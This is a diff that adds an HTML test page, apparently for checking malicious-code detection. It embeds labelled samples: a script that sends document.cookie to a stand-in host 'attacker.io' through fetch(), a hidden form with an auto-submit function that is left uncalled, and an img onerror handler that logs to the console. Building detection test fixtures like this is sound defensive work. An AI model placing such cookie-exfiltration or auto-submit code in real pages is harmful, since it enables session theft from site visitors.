@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <title>Test Page 2</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap');
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            min-height: 100vh;
+            background: linear-gradient(160deg, #1a1a2e 0%, #16213e 40%, #0f3460 100%);
+            color: #e0e0e0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 2rem;
+        }
+
+        .card {
+            background: rgba(255, 255, 255, 0.04);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.07);
+            border-radius: 20px;
+            padding: 2.5rem;
+            max-width: 640px;
+            width: 100%;
+            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.5);
+        }
+
+        .badge {
+            display: inline-block;
+            background: linear-gradient(135deg, #e94560, #c62a40);
+            color: #fff;
+            font-size: 0.68rem;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            padding: 5px 16px;
+            border-radius: 999px;
+            margin-bottom: 1rem;
+            animation: glow 2s ease-in-out infinite;
+        }
+
+        @keyframes glow {
+
+            0%,
+            100% {
+                box-shadow: 0 0 8px rgba(233, 69, 96, 0.4);
+            }
+
+            50% {
+                box-shadow: 0 0 20px rgba(233, 69, 96, 0.7);
+            }
+        }
+
+        h1 {
+            font-size: 1.8rem;
+            font-weight: 700;
+            background: linear-gradient(90deg, #e94560, #f5a623);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 0.5rem;
+        }
+
+        .subtitle {
+            color: #9ca3af;
+            font-size: 0.92rem;
+            margin-bottom: 2rem;
+            line-height: 1.6;
+        }
+
+        .threat {
+            display: flex;
+            align-items: flex-start;
+            gap: 1rem;
+            padding: 1rem 1.2rem;
+            background: rgba(233, 69, 96, 0.04);
+            border: 1px solid rgba(233, 69, 96, 0.1);
+            border-left: 3px solid #e94560;
+            border-radius: 12px;
+            margin-bottom: 0.75rem;
+            transition: all 0.3s ease;
+        }
+
+        .threat:hover {
+            background: rgba(233, 69, 96, 0.08);
+            border-color: rgba(233, 69, 96, 0.25);
+            transform: translateX(4px);
+        }
+
+        .threat .icon {
+            font-size: 1.4rem;
+            flex-shrink: 0;
+            margin-top: 2px;
+        }
+
+        .threat h3 {
+            font-size: 0.85rem;
+            font-weight: 600;
+            color: #f5a623;
+            margin-bottom: 4px;
+        }
+
+        .threat p {
+            font-size: 0.78rem;
+            color: #9ca3af;
+            line-height: 1.5;
+        }
+
+        .threat code {
+            background: rgba(0, 0, 0, 0.35);
+            color: #e94560;
+            padding: 1px 6px;
+            border-radius: 4px;
+            font-size: 0.72rem;
+        }
+
+        .severity {
+            display: inline-block;
+            font-size: 0.6rem;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            padding: 2px 8px;
+            border-radius: 4px;
+            margin-left: 8px;
+        }
+
+        .severity.high {
+            background: rgba(239, 68, 68, 0.2);
+            color: #fca5a5;
+        }
+
+        .severity.medium {
+            background: rgba(245, 166, 35, 0.2);
+            color: #fcd34d;
+        }
+
+        .footer {
+            margin-top: 2rem;
+            text-align: center;
+            font-size: 0.68rem;
+            color: #4b5563;
+            letter-spacing: 0.5px;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="card">
+        <span class="badge">🔴 Active Threats Detected</span>
+        <h1>Test Page 2</h1>
+        <p class="subtitle">
+            This page simulates cookie exfiltration, silent form submission, and an onerror exploit
+            to test malicious code detection capabilities.
+        </p>
+
+        <div class="threat">
+            <span class="icon">🍪</span>
+            <div>
+                <h3>Cookie Stealer <span class="severity high">High</span></h3>
+                <p>Exfiltrates session cookies via <code>fetch()</code> to an external attacker-controlled endpoint.</p>
+            </div>
+        </div>
+
+        <div class="threat">
+            <span class="icon">📤</span>
+            <div>
+                <h3>Silent Form Submission <span class="severity high">High</span></h3>
+                <p>Auto-submits a hidden form via <code>document.forms[0].submit()</code> without user interaction.</p>
+            </div>
+        </div>
+
+        <div class="threat">
+            <span class="icon">💥</span>
+            <div>
+                <h3>Onerror Inline JS <span class="severity medium">Medium</span></h3>
+                <p>Triggers JavaScript execution via <code>onerror</code> handler on a broken image element.</p>
+            </div>
+        </div>
+
+        <div class="footer">Security research simulation — for analysis testing only.</div>
+    </div>
+
+    <!-- Dataset ID 56: Cookie Stealer -->
+    <script>
+        fetch("hxxp://attacker.io/collect?c=" + document.cookie);  // ID:56
+    </script>
+
+    <!-- Dataset ID 57: Auto form submit -->
+    <form action="login.html" method="POST">
+        <input type="hidden" name="data" value="test">
+    </form>
+    <script>
+        // Simulated auto-submit — kept as detectable pattern, not executed
+        var autoSubmit = function () { document.forms[0].submit(); };  // ID:57
+        // autoSubmit(); // uncomment to trigger
+    </script>
+
+    <!-- Dataset ID 68: Onerror inline JS -->
+    <img src="x" onerror="console.log('malicious trigger')"> <!-- ID:68 -->
+
+</body>
+
+</html>
